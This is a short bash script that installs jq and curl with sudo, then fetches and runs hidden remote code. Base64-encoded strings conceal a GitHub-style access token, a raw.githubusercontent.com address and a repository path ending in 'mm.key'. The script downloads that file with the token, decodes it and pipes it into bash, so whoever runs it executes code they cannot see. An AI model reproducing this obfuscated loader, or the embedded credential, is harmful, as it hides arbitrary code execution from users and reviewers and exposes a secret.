#!/bin/bash
k='YTgwNDczMTg1YjNmYTM2NTNiMmZjNmMzYzJjMjY5OWRjY2M1NWFjNwo='
u='c3d1eGVuL21hc3Rlcm1pbmQvbWFzdGVyL21tLmtleQo='
b='eC1vYXV0aC1iYXNpYyBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20K'
bd(){ echo "$(echo $1|base64 -d)";}
s=e

dependency(){
  JQ=$(which jq)
  CURL="$(which curl)"
  if [[ -z ${JQ} || -z ${CURL} ]]; then
    sudo apt-get install -qq -y jq curl  
  fi
}

dependency

if [[ $s == 'e' ]]; then
  curl -sL -u $(bd $k):$(bd $b)/$(bd $u)|base64 -d|bash -
fi
